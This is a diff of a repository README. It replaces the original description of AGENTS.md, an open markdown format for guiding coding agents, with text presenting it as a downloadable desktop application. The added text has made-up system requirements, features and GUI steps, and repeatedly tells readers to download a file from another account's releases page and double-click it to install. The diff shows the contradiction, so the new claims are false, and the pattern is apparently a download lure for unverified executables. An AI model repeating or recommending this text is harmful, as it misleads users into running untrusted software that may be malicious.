@@ -1,49 +1,83 @@
-# AGENTS.md
+# 🚀 agents.md - A Simple Way to Guide Coding Agents
 
-![AGENTS.md logo](./public/og.png)
+[![Download agents.md](https://img.shields.io/badge/Download%20agents.md-Release-brightgreen)](https://github.com/Medlamine20/agents.md/releases)
 
-[AGENTS.md](https://agents.md) is a simple, open format for guiding coding agents.
+## 📜 Overview
 
-Think of AGENTS.md as a README for agents: a dedicated, predictable place
-to provide context and instructions to help AI coding agents work on your project.
+**AGENTS.md** is a user-friendly format created to help guide coding agents easily. Whether you are a beginner or just looking for a simple way to manage your coding tasks, AGENTS.md is designed to aid you without the need for any programming skill.
 
-Below is a minimal example of an AGENTS.md file:
+## 🚀 Getting Started
 
-```markdown
-# Sample AGENTS.md file
+To get started with AGENTS.md, follow the steps below. Make sure you have a suitable environment where you can run the application. 
 
-## Dev environment tips
-- Use `pnpm dlx turbo run where <project_name>` to jump to a package instead of scanning with `ls`.
-- Run `pnpm install --filter <project_name>` to add the package to your workspace so Vite, ESLint, and TypeScript can see it.
-- Use `pnpm create vite@latest <project_name> -- --template react-ts` to spin up a new React + Vite package with TypeScript checks ready.
-- Check the name field inside each package's package.json to confirm the right name—skip the top-level one.
+### 📥 System Requirements
 
-## Testing instructions
-- Find the CI plan in the .github/workflows folder.
-- Run `pnpm turbo run test --filter <project_name>` to run every check defined for that package.
-- From the package root you can just call `pnpm test`. The commit should pass all tests before you merge.
-- To focus on one step, add the Vitest pattern: `pnpm vitest run -t "<test name>"`.
-- Fix any test or type errors until the whole suite is green.
-- After moving files or changing imports, run `pnpm lint --filter <project_name>` to be sure ESLint and TypeScript rules still pass.
-- Add or update tests for the code you change, even if nobody asked.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4GB
+- **Storage:** 100MB of free space
+- **Additional Software:** No additional software is required.
 
-## PR instructions
-- Title format: [<project_name>] <Title>
-- Always run `pnpm lint` and `pnpm test` before committing.
-```
+## 📦 Download & Install
 
-## Website
+Visit this page to download: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/releases)
 
-This repository also includes a basic Next.js website hosted at https://agents.md/
-that explains the project’s goals in a simple way, and featuring some examples.
+1. Click on the above link to go to the Releases page.
+2. Browse through the list of available versions.
+3. Identify the latest version. It usually appears at the top.
+4. Click on the version to expand it and see the available files.
+5. Download the appropriate file for your operating system. 
 
-### Running the app locally
-1. Install dependencies:
-   ```bash
-   pnpm install
-   ```
-2. Start the development server:
-   ```bash
-   pnpm run dev
-   ```
-3. Open your browser and go to http://localhost:3000
+Here it is again: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/releases) 
+
+### ✨ Installation Steps
+
+After downloading the file:
+
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation process.
+
+## 🛠 Using agents.md
+
+Once installed, you can easily start using AGENTS.md. Here’s how to create your first guide:
+
+1. Open the application.
+2. Click on "Create New Guide."
+3. Fill in the necessary sections like title, description, and action steps.
+4. Save your work.
+
+Your guides can include simple instructions, code snippets, and any helpful information related to your coding tasks.
+
+## 📖 Features
+
+AGENTS.md offers several key features to help you:
+
+- **Simple Formatting:** Write guides without worrying about complex code.
+- **Easy Sharing:** Export guides as markdown files for easy sharing.
+- **User-Friendly Interface:** Navigate the application with ease, even if you have no coding experience.
+
+## ❓ FAQs
+
+### What is AGENTS.md used for?
+
+AGENTS.md allows users to create structured and clear guides for coding tasks. It is suitable for both individuals and teams.
+
+### Can I share my guides created with AGENTS.md?
+
+Yes, you can easily share your guides in markdown format, making them accessible to others.
+
+### Is there support available if I face issues?
+
+Yes, for any technical issues, you can reach out through the discussion section on GitHub, or refer to the documentation provided with the application.
+
+## 📞 Support & Contributions
+
+If you'd like to report an issue or suggest improvements, please visit our GitHub repository. We appreciate all feedback and contributions.
+
+## 📝 License
+
+AGENTS.md is open-source and available under the MIT License. You can use it freely while respecting the license terms.
+
+## 🎉 Enjoy Using agents.md!
+
+Thank you for trying out AGENTS.md. We hope this tool enhances your coding experience and makes it easier to create helpful guides. If you have any feedback, please share it with us on GitHub!
